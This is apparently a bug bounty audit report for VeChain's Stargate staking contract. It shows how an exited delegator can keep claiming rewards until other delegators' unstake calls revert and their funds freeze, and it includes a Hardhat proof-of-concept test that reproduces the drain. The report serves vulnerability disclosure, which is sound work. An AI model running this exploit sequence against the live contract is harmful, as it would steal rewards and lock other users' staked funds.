# 59850 sc high users funds stuck in the contract permanently

**Submitted on Nov 16th 2025 at 11:59:09 UTC by @danvinci\_20 for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #59850
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Permanent freezing of funds

## Description

### Summary

When a delegator requests a delegation exit, the contract immediately reduces their effective stake, but still allows the delegator to keep claiming rewards for future periods after exit. Because reward distribution uses effective stake ratios, the exited delegator’s artificially reduced effective stake distorts the share calculations for remaining delegators.

This leads to two severe effects:

* Exited delegator steals rewards for periods they did not participate in.
* Protocol VTHO balance becomes insufficient, causing remaining delegators to revert when calling `unstake()` due to: builtin: insufficient balance

→ Their VTHO rewards stolen + staked VET become permanently locked in the contract.

This is a funds-freezing critical vulnerability impacting all users still delegating.

## Vulnerability Details

Root Cause `requestDelegationExit()` reduces the user’s effective stake immediately via:

```solidity
_updatePeriodEffectiveStake($, delegation.validator, _tokenId, completedPeriods + 2, false);
```

But does not prevent the user from continuing to claim future rewards.

Reward Claim Logic Fails to Enforce End-of-Stake Boundary The function `_claimableDelegationPeriods()` returns periods even after stake exit:

```solidity
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);
}
```

Meaning: even after exit → if more periods pass → user keeps claiming.

Reward Settlement Logic Ignores End-Period The reward calculation:

```solidity
uint256 claimableAmount = _claimableRewards($, _tokenId, 0);
```

does not check if the delegator was still staked for those periods. Exited delegator drains new rewards from future periods using a reduced effective stake, creating mathematically invalid reward shares.

## Final Breakage Point

When a later delegator tries to call:

```solidity
unstake(tokenId2)

/// @inheritdoc IStargate
function unstake(
    uint256 _tokenId
) external whenNotPaused onlyTokenOwner(_tokenId) nonReentrant {
  ........................................................
    // ensure that the rewards are claimed
@>>    _claimRewards($, _tokenId);

    // reset the mappings in storage regarding this delegation
    _resetDelegationDetails($, _tokenId);

    // burn the token
    $.stargateNFTContract.burn(_tokenId);

    // validate the contract has enough VET to transfer to the caller
    if (address(this).balance < token.vetAmountStaked) {
        revert InsufficientContractBalance(address(this).balance, token.vetAmountStaked);
    }

    // transfer the VET to the caller (which is also the owner of the NFT since only the owner can unstake)
    (bool success, ) = msg.sender.call{ value: token.vetAmountStaked }("");
    if (!success) {
        revert VetTransferFailed(msg.sender, token.vetAmountStaked);
    }
}
```

Because the contract no longer has enough `VTHO` to cover mandatory reward claims made inside `unstake()`, the call reverts:

* The user is permanently stuck.
* Funds are frozen.
* Delegator 2 cannot exit.

## Note

This bug is different from report 59665; even if that issue is fixed, this bug still occurs.

## Proof of Concept

Run the test:

```bash
yarn hardhat test --network vechain_solo test/integration/Delegation.test.ts
```

Test case demonstrating the issue:

```typescript
it.only("VTHO rewards gets stolen by exited delegator and funds stuck due to insufficient VTHO balance.", async () => {
    const paramsKey = "0x00000000000064656c656761746f722d636f6e74726163742d61646472657373";
    const stargateAddress = await protocolParamsContract.get(paramsKey);
    const expectedParamsVal = BigInt(await stargateContract.getAddress());
    expect(stargateAddress).to.equal(expectedParamsVal);

    const validatorAddress = await protocolStakerContract.firstActive();
    expect(compareAddresses(validatorAddress, deployer.address)).to.be.true;

    const [leaderGroupSize, queuedValidators] =
        await protocolStakerContract.getValidationsNum();
    expect(leaderGroupSize).to.equal(1);
    expect(queuedValidators).to.equal(0);

    // staking the token here 
    const levelId = 1;
    const levelSpec = await stargateNFTContract.getLevel(levelId);
    const levelVetAmountRequired = levelSpec.vetAmountRequiredToStake;

    // Stake an NFT of level 1
    let stakeTx = await stargateContract
        .connect(user)
        .stake(levelId, { value: levelVetAmountRequired });
    await stakeTx.wait();
    log("\n🎉 Correctly staked an NFT of level", levelId);

    const tokenId1 = await stargateNFTContract.getCurrentTokenId();

    // Fast-forward until the NFT is mature
    await mineBlocks(Number(levelSpec.maturityBlocks));
    log("\n🚀 Fast-forwarded", Number(levelSpec.maturityBlocks), "blocks to mature the NFT");

    stakeTx = await stargateContract
        .connect(user)
        .stake(levelId, { value: levelVetAmountRequired });
    await stakeTx.wait();
    log("\n🎉 Correctly staked an NFT of level", levelId);

    // Fast-forward until the NFT is mature
    await mineBlocks(Number(levelSpec.maturityBlocks));
    log("\n🚀 Fast-forwarded", Number(levelSpec.maturityBlocks), "blocks to mature the NFT");

    const tokenId2 = await stargateNFTContract.getCurrentTokenId();

    let delegateTx = await stargateContract.connect(user).delegate(tokenId1, deployer.address);
    await delegateTx.wait();
    console.log("\n🎉 Correctly delegated the NFT to validator", deployer.address);

    delegateTx = await stargateContract.connect(user).delegate(tokenId2, deployer.address);
    await delegateTx.wait();
    console.log("\n🎉 Correctly delegated the NFT to validator", deployer.address);

    const [period, startBlock, ,] = await protocolStakerContract.getValidationPeriodDetails(
        deployer.address
    );
    await fastForwardValidatorPeriods(
        Number(period),
        Number(startBlock),
        4
    );

    await stargateContract.connect(user).requestDelegationExit(tokenId1);

    await fastForwardValidatorPeriods(
        Number(period),
        Number(startBlock),
        0
    );

    // let delegation = await stargateContract.getDelegationDetails(tokenId1);
    let status = await stargateContract.getDelegationStatus(tokenId1);
    console.log("status exit  of delegation: ", status);

    let [first, last] =  await stargateContract.claimableDelegationPeriods(tokenId1);
    console.log(first, last);

    await stargateContract.connect(user).claimRewards(tokenId1);

    await fastForwardValidatorPeriods(
        Number(period),
        Number(startBlock),
        4
    );

    // showing the user can also claim for another rewards 
    [first, last] =  await stargateContract.claimableDelegationPeriods(tokenId1);
    console.log(first, last);

    // claims another period again even though he is already exited
    await stargateContract.connect(user).claimRewards(tokenId1);

    // tokenId2 now won't be able to exit due to insufficient token balance
    // request to exit the delegation and exit for delegator 2
    await stargateContract.connect(user).requestDelegationExit(tokenId2);
    await fastForwardValidatorPeriods(
        Number(period),
        Number(startBlock),
        0
    );

    await expect(
         stargateContract.connect(user).unstake(tokenId2)).to.be.rejectedWith("builtin: insufficient balance");
});
```

Observed output:

```
🎉 Correctly delegated the NFT to validator 0xf077b491b355E64048cE21E3A6Fc4751eEeA77fa

🎉 Correctly delegated the NFT to validator 0xf077b491b355E64048cE21E3A6Fc4751eEeA77fa
status exit  of delegation:  3n
2n 6n
7n 11n
    ✔ VTHO rewards gets stucked and accumulate in contracts. (54573ms)


  1 passing (60s)
```
